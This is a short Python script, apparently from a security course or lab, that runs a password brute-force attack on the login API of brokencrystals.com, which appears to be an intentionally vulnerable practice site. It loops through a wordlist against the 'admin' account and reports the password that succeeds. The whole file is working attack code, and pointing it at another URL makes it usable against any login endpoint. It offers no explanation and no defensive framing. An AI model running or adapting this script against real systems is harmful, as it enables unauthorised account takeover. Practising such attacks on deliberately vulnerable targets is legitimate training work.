print("CSN Script for performing a bruteforce attack!\n")

import  requests
import json

url = 'https://brokencrystals.com/api/auth/login'
headers = {
    'accept': 'application/json',
    'Content-Type': 'application/json'
}
username = 'admin'

def login_user(username, password):
    data = {
        'user': username,
        'password': password,
        'op': 'basic'
    }
    response = requests.post(url, headers=headers, data=json.dumps(data))
    return response.status_code, response.json()

with open('passwords.txt', 'r') as pwdList:
    passwords = pwdList.readlines()


for p in passwords:
    p = p.strip()
    status, response = login_user(username, p)
    print(f'Trying password: {p}')
    print(f'Status Code: {status}')
    print(f'Response: {response}\n')
    
    if status == 201:
        print('Bingo!!!')
        print(f'Login successful with password: {p}')
        print(f'Success Response: {response}')
        break